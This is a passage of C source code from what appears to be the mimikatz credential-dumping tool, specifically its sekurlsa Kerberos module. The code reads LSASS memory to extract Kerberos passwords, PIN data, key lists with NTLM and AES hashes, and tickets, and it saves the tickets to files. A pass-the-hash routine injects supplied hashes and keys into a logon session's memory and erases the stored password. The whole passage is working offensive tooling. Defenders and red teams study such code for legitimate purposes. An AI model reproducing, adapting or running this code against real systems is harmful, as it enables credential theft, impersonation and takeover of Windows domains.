	KIWI_KERBEROS_ENUM_DATA data = {kuhl_m_sekurlsa_enum_kerberos_callback_passwords, NULL};
	kuhl_m_sekurlsa_enum_generic_callback_kerberos(pData, &data);
}

NTSTATUS kuhl_m_sekurlsa_kerberos_tickets(int argc, wchar_t * argv[])
{
	KIWI_KERBEROS_ENUM_DATA_TICKET ticketData = {argc, FALSE};
	KIWI_KERBEROS_ENUM_DATA data = {kuhl_m_sekurlsa_enum_kerberos_callback_tickets, &ticketData};
	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_generic, &data);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_kerberos_keys(int argc, wchar_t * argv[])
{
	KIWI_KERBEROS_ENUM_DATA data = {kuhl_m_sekurlsa_enum_kerberos_callback_keys, NULL};
	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_generic, &data);
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_generic(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	kuhl_m_sekurlsa_enum_generic_callback_kerberos(pData, (PKIWI_KERBEROS_ENUM_DATA) pOptionalData);
	return TRUE;
}

void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_passwords(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
{
	KIWI_GENERIC_PRIMARY_CREDENTIAL creds = {0};
	DWORD szCsp;
	PBYTE infosCsp;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {*(PVOID *) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetSmartCard), pData->cLsass->hLsassMem};

	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds), pData, (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1607) ? KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607);
	if(aLsassMemory.address)
	{
		if(infosCsp = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structCspInfosSize))
		{
			aLocalMemory.address = infosCsp;
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, kerbHelper[KerbOffsetIndex].structCspInfosSize))
			{
				creds.UserName = *(PUNICODE_STRING) infosCsp;
				if(szCsp = *(PDWORD) (infosCsp + kerbHelper[KerbOffsetIndex].offsetSizeOfCsp))
				{
					creds.Domaine.Length = (USHORT)	(szCsp - (kerbHelper[KerbOffsetIndex].offsetNames - kerbHelper[KerbOffsetIndex].structCspInfosSize));
					if(creds.Domaine.Buffer = (PWSTR) LocalAlloc(LPTR, creds.Domaine.Length))
					{
						aLsassMemory.address = (PBYTE) aLsassMemory.address + kerbHelper[KerbOffsetIndex].offsetNames;
						aLocalMemory.address = creds.Domaine.Buffer;
						kull_m_memory_copy(&aLocalMemory, &aLsassMemory, creds.Domaine.Length);
					}
				}
				kuhl_m_sekurlsa_genericCredsOutput(&creds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE | ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : 0));
				if(creds.Domaine.Buffer)
					LocalFree(creds.Domaine.Buffer);
			}
			LocalFree(infosCsp);
		}
	}
}

const wchar_t * KUHL_M_SEKURLSA_KERBEROS_TICKET_TYPE[] = {L"Ticket Granting Service", L"Client Ticket ?", L"Ticket Granting Ticket",};
void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
{
	PKIWI_KERBEROS_ENUM_DATA_TICKET ticketData = (PKIWI_KERBEROS_ENUM_DATA_TICKET) pOptionalData;
	DWORD i;
	kuhl_m_sekurlsa_printinfos_logonData(pData);
	kuhl_m_sekurlsa_enum_kerberos_callback_passwords(pData, Localkerbsession, RemoteLocalKerbSession, NULL);
	kprintf(L"\n");
	for(i = 0; i < 3; i++)
	{
		kprintf(L"\n\tGroup %u - %s", i, KUHL_M_SEKURLSA_KERBEROS_TICKET_TYPE[i]);
		kuhl_m_sekurlsa_kerberos_enum_tickets(pData, i, (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetTickets[i], ticketData->isTicketExport);
		kprintf(L"\n");
	}
}

void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_keys(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
{
	DWORD i, nbHash;
	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = {NULL, Localkerbsession.hMemory}, aLocalHashMemory = {NULL, Localkerbsession.hMemory};
	if(RemoteLocalKerbSession.address =  *(PVOID *) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetKeyList))
	{
		kuhl_m_sekurlsa_printinfos_logonData(pData);
		kuhl_m_sekurlsa_enum_kerberos_callback_passwords(pData, Localkerbsession, RemoteLocalKerbSession, NULL);
		kprintf(L"\n\t * Key List :\n");
		if(aLocalKeyMemory.address = LocalAlloc(LPTR,  kerbHelper[KerbOffsetIndex].structKeyListSize))
		{
			if(kull_m_memory_copy(&aLocalKeyMemory, &RemoteLocalKerbSession, kerbHelper[KerbOffsetIndex].structKeyListSize))
			{
				if(nbHash = ((DWORD *)(aLocalKeyMemory.address))[1])
				{
					RemoteLocalKerbSession.address = (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].structKeyListSize;
					i = nbHash * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
					if(aLocalHashMemory.address = LocalAlloc(LPTR, i))
					{
						if(kull_m_memory_copy(&aLocalHashMemory, &RemoteLocalKerbSession, i))
							for(i = 0; i < nbHash; i++)
								kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalHashMemory.address + i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric), pData, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_VISTA) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)));
						LocalFree(aLocalHashMemory.address);
					}
				}
			}
			LocalFree(aLocalKeyMemory.address);
		}
	}
}

void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData)
{
	PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;
	DWORD i, nbHash;
	BYTE ntlmHash[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
	BOOL isNtlm = FALSE, isAes128 = FALSE, isAes256 = FALSE;
	UNICODE_STRING nullPasswd = {0, 0, NULL};
	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = {NULL, Localkerbsession.hMemory}, aLocalHashMemory = {NULL, Localkerbsession.hMemory}, aLocalNTLMMemory = {NULL, Localkerbsession.hMemory}, aLocalPasswdMemory = {&nullPasswd, Localkerbsession.hMemory}, aRemotePasswdMemory = {(PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetPasswordErase, RemoteLocalKerbSession.hMemory};
	PKERB_HASHPASSWORD_GENERIC pHash;
	PBYTE baseCheck;
	PCWCHAR resultok;
	SIZE_T offset;

	if(RemoteLocalKerbSession.address =  *(PVOID *) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetKeyList))
	{
		if(aLocalKeyMemory.address = LocalAlloc(LPTR,  kerbHelper[KerbOffsetIndex].structKeyListSize))
		{
			if(kull_m_memory_copy(&aLocalKeyMemory, &RemoteLocalKerbSession, kerbHelper[KerbOffsetIndex].structKeyListSize))
			{
				if(nbHash = ((DWORD *)(aLocalKeyMemory.address))[1])
				{
					if(isNtlm = (pthData->NtlmHash != NULL))
					{
						RtlCopyMemory(ntlmHash, pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
						if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_VISTA)	
							(*pData->lsassLocalHelper->pLsaProtectMemory)(ntlmHash, LM_NTLM_HASH_LENGTH);
					}
					
					if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_7)
					{
						if(isAes128 = (pthData->Aes128Key != NULL))
						{
							RtlCopyMemory(aes128key, pthData->Aes128Key, AES_128_KEY_LENGTH);
							(*pData->lsassLocalHelper->pLsaProtectMemory)(aes128key, AES_128_KEY_LENGTH);
						}
						if(isAes256 = (pthData->Aes256Key != NULL))
						{
							RtlCopyMemory(aes256key, pthData->Aes256Key, AES_256_KEY_LENGTH);
							(*pData->lsassLocalHelper->pLsaProtectMemory)(aes256key, AES_256_KEY_LENGTH);
						}
					}

					RemoteLocalKerbSession.address = baseCheck = (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].structKeyListSize;
					i = nbHash * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
					if(aLocalHashMemory.address = LocalAlloc(LPTR, i))
					{
						if(kull_m_memory_copy(&aLocalHashMemory, &RemoteLocalKerbSession, i))
						{
							kprintf(L"data copy @ %p", RemoteLocalKerbSession.address, nbHash);
							for(i = 0, pthData->isReplaceOk = TRUE; (i < nbHash) && pthData->isReplaceOk; i++)
							{
								offset = i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric;
								pHash = (PKERB_HASHPASSWORD_GENERIC) ((PBYTE) aLocalHashMemory.address + offset);
								kprintf(L"\n   \\_ %s ", kuhl_m_kerberos_ticket_etype(pHash->Type));
								
								RemoteLocalKerbSession.address = pHash->Checksump;
								resultok = L"OK";
								if(isNtlm && ((pHash->Type != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (pHash->Type != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)) && (pHash->Size == LM_NTLM_HASH_LENGTH))
								{
									aLocalNTLMMemory.address = ntlmHash;
									offset = LM_NTLM_HASH_LENGTH;
								}
								else if(isAes128 && (pHash->Type == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (pHash->Size == AES_128_KEY_LENGTH))
								{
									aLocalNTLMMemory.address = aes128key;
									offset = AES_128_KEY_LENGTH;
								}
								else if(isAes256 && (pHash->Type == KERB_ETYPE_AES256_CTS_HMAC_SHA1_96) && (pHash->Size == AES_256_KEY_LENGTH))
								{
									aLocalNTLMMemory.address = aes256key;
									offset = AES_256_KEY_LENGTH;
								}
								else
								{
									aLocalNTLMMemory.address = pHash;
									RemoteLocalKerbSession.address = baseCheck + offset;
									offset = FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC, Checksump);
									resultok = kuhl_m_kerberos_ticket_etype(KERB_ETYPE_NULL);
									
									pHash->Type = KERB_ETYPE_NULL;
									pHash->Size = 0;
									kprintf(L"-> ");
								}

								if(pthData->isReplaceOk = kull_m_memory_copy(&RemoteLocalKerbSession, &aLocalNTLMMemory, offset))
									kprintf(L"%s", resultok);
								else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
							}

							if(pthData->isReplaceOk)
							{
								kprintf(L"\n   \\_ *Password replace @ %p (%u) -> ", aRemotePasswdMemory.address, (DWORD) kerbHelper[KerbOffsetIndex].passwordEraseSize);
								if(aLocalPasswdMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].passwordEraseSize))
								{
									if(pthData->isReplaceOk = kull_m_memory_copy(&aRemotePasswdMemory, &aLocalPasswdMemory, kerbHelper[KerbOffsetIndex].passwordEraseSize))
										kprintf(L"null");
									else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
									LocalFree(aLocalPasswdMemory.address);
								}
							}
						}
						LocalFree(aLocalHashMemory.address);
					}
				}
			}
			LocalFree(aLocalKeyMemory.address);
		}
	}
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;
	KIWI_KERBEROS_ENUM_DATA data = {kuhl_m_sekurlsa_enum_kerberos_callback_pth, pthData};
	if(SecEqualLuid(pData->LogonId, pthData->LogonId))
	{
		kuhl_m_sekurlsa_enum_generic_callback_kerberos(pData, &data);
		return FALSE;
	}
	else return TRUE;

}

void kuhl_m_sekurlsa_enum_generic_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKIWI_KERBEROS_ENUM_DATA pEnumData)
{
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
	if(kuhl_m_sekurlsa_kerberos_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_kerberos_package.Module, KerberosReferences, ARRAYSIZE(KerberosReferences), &KerbLogonSessionListOrTable, NULL, NULL, &KerbOffsetIndex))
	{
		aLsassMemory.address = KerbLogonSessionListOrTable;
		if(pData->cLsass->osContext.MajorVersion < 6)
			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);
		else
			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromAVLByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);

		if(aLsassMemory.address)
		{
			if(aLocalMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structSize))
			{
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, kerbHelper[KerbOffsetIndex].structSize))
					pEnumData->callback(pData, aLocalMemory, aLsassMemory, pEnumData->optionalData);
				LocalFree(aLocalMemory.address);
			}
		}
	} else kprintf(L"KO");
}

void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN DWORD grp, IN PVOID tickets, IN BOOL isFile)
{
	PVOID pStruct, pRef = tickets;
	KULL_M_MEMORY_ADDRESS data = {&pStruct, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aTicket = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassBuffer = {tickets, pData->cLsass->hLsassMem};
	DWORD nbTickets = 0;
	PKIWI_KERBEROS_TICKET pKiwiTicket;
	PBERVAL BerApp_KrbCred;
	BOOL isNormalSessionKey;
	wchar_t * filename;

	if(aTicket.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structTicketSize))
	{
		if(kull_m_memory_copy(&data, &aLsassBuffer, sizeof(PVOID)))
		{
			data.address = pStruct;
			data.hMemory = pData->cLsass->hLsassMem;

			while(data.address != pRef)
			{
				if(kull_m_memory_copy(&aTicket, &data, kerbHelper[KerbOffsetIndex].structTicketSize))
				{
					kprintf(L"\n\t [%08x]", nbTickets);
					if(pKiwiTicket = kuhl_m_sekurlsa_kerberos_createTicket((LPBYTE) aTicket.address, pData->cLsass->hLsassMem))
					{
						isNormalSessionKey = (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1507) || (pKiwiTicket->Key.Length < (ULONG) FIELD_OFFSET(LSAISO_DATA_BLOB, data));
						kuhl_m_kerberos_ticket_display(pKiwiTicket, isNormalSessionKey, FALSE);
						if(isFile)
							if(filename = kuhl_m_sekurlsa_kerberos_generateFileName(pData->LogonId, grp, nbTickets, pKiwiTicket, MIMIKATZ_KERBEROS_EXT))
							{
								if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(pKiwiTicket, FALSE))
								{
									if(kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
										kprintf(L"\n\t   * Saved to file %s !", filename);
									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
									ber_bvfree(BerApp_KrbCred);
								}
								LocalFree(filename);
							}

						if(!isNormalSessionKey)
						{
							kprintf(L"\n\t   LSA Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));

							if(pKiwiTicket->Key.Length <= (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("KerberosKey") - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
								kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) pKiwiTicket->Key.Value);
							else
								kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) pKiwiTicket->Key.Value, pKiwiTicket->Key.Length);
						}

						kuhl_m_kerberos_ticket_freeTicket(pKiwiTicket);
					}
					data.address = ((PLIST_ENTRY) (aTicket.address))->Flink;
				}
				else break;
				nbTickets++;
			}
		}
		LocalFree(aTicket.address);
	}
}

wchar_t * kuhl_m_sekurlsa_kerberos_generateFileName(PLUID LogonId, const DWORD grp, const DWORD index, PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext)
{
	wchar_t * buffer;
	size_t charCount = 0x1000;
	BOOL isLong = kuhl_m_kerberos_ticket_isLongFilename(ticket);

	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
	{
		if(isLong)
			isLong = swprintf_s(buffer, charCount, L"[%x;%x]-%1u-%u-%08x-%wZ@%wZ-%wZ.%s", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
		else
			isLong = swprintf_s(buffer, charCount, L"[%x;%x]-%1u-%u-%08x.%s", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, ext) > 0;
		
		if(isLong)
			kull_m_file_cleanFilename(buffer);
		else
			buffer = (wchar_t *) LocalFree(buffer);
	}
	return buffer;
}

PKIWI_KERBEROS_TICKET kuhl_m_sekurlsa_kerberos_createTicket(PBYTE pTicket, PKULL_M_MEMORY_HANDLE hLSASS)
{
	BOOL status = FALSE;
	PKIWI_KERBEROS_TICKET ticket;
	
	if(ticket = (PKIWI_KERBEROS_TICKET) LocalAlloc(LPTR, sizeof(KIWI_KERBEROS_TICKET)))
	{
		ticket->StartTime = *(PFILETIME) (pTicket + kerbHelper[KerbOffsetIndex].offsetStartTime);
		ticket->EndTime = *(PFILETIME) (pTicket + kerbHelper[KerbOffsetIndex].offsetEndTime);
		ticket->RenewUntil = *(PFILETIME) (pTicket + kerbHelper[KerbOffsetIndex].offsetRenewUntil);
		
		ticket->ServiceName = *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetServiceName);
		kuhl_m_sekurlsa_kerberos_createExternalName(&ticket->ServiceName, hLSASS);
		ticket->DomainName = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetDomainName);
		kull_m_process_getUnicodeString(&ticket->DomainName, hLSASS);

		ticket->TargetName = *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetTargetName);
		kuhl_m_sekurlsa_kerberos_createExternalName(&ticket->TargetName, hLSASS);
		ticket->TargetDomainName = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetTargetDomainName);
		kull_m_process_getUnicodeString(&ticket->TargetDomainName, hLSASS);

		ticket->ClientName = *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetClientName);
		kuhl_m_sekurlsa_kerberos_createExternalName(&ticket->ClientName, hLSASS);
		ticket->AltTargetDomainName = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetAltTargetDomainName);
		kull_m_process_getUnicodeString(&ticket->AltTargetDomainName, hLSASS);

		ticket->Description = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetDescription);
		kull_m_process_getUnicodeString(&ticket->Description, hLSASS);

		ticket->KeyType = *(PLONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetKeyType));
		ticket->Key = *(PKIWI_KERBEROS_BUFFER) ((pTicket + kerbHelper[KerbOffsetIndex].offsetKey));;
		kuhl_m_sekurlsa_kerberos_createKiwiKerberosBuffer(&ticket->Key, hLSASS);

		ticket->TicketFlags = *(PULONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetTicketFlags));
		ticket->TicketEncType = *(PLONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetTicketEncType));
		ticket->TicketKvno = *(PULONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetTicketKvno));
		ticket->Ticket = *(PKIWI_KERBEROS_BUFFER) ((pTicket + kerbHelper[KerbOffsetIndex].offsetTicket));;
		kuhl_m_sekurlsa_kerberos_createKiwiKerberosBuffer(&ticket->Ticket, hLSASS);
	}
	return ticket;
}

void kuhl_m_sekurlsa_kerberos_createExternalName(PKERB_EXTERNAL_NAME *pExternalName, PKULL_M_MEMORY_HANDLE hLSASS)
{
	BOOL status = FALSE;
	KERB_EXTERNAL_NAME extName;
	PKERB_EXTERNAL_NAME pTempName;
	KULL_M_MEMORY_ADDRESS aName = {*pExternalName, hLSASS}, aLocalBuffer = {&extName, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	DWORD i;

	if(aName.address)
	{
		*pExternalName = NULL;
		if(kull_m_memory_copy(&aLocalBuffer, &aName, sizeof(KERB_EXTERNAL_NAME) - sizeof(UNICODE_STRING)))
		{
			i = sizeof(KERB_EXTERNAL_NAME) + (sizeof(UNICODE_STRING) * (extName.NameCount - 1));
			if(pTempName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, i))
			{
				*pExternalName = pTempName;
				aLocalBuffer.address = pTempName;
				if(status = kull_m_memory_copy(&aLocalBuffer, &aName, i))
					for(i = 0; status && (i < pTempName->NameCount); i++)
						status = kull_m_process_getUnicodeString(&pTempName->Names[i], hLSASS);
			}
		}
	}
}

void kuhl_m_sekurlsa_kerberos_createKiwiKerberosBuffer(PKIWI_KERBEROS_BUFFER pBuffer, PKULL_M_MEMORY_HANDLE hLSASS)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_ADDRESS aBuffer = {pBuffer->Value, hLSASS}, aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	
	pBuffer->Value = NULL;
	if(aBuffer.address)
	{
		if(aLocalBuffer.address = LocalAlloc(LPTR, pBuffer->Length))
		{
			pBuffer->Value = (PUCHAR) aLocalBuffer.address;
			kull_m_memory_copy(&aLocalBuffer, &aBuffer, pBuffer->Length);
		}
	}
}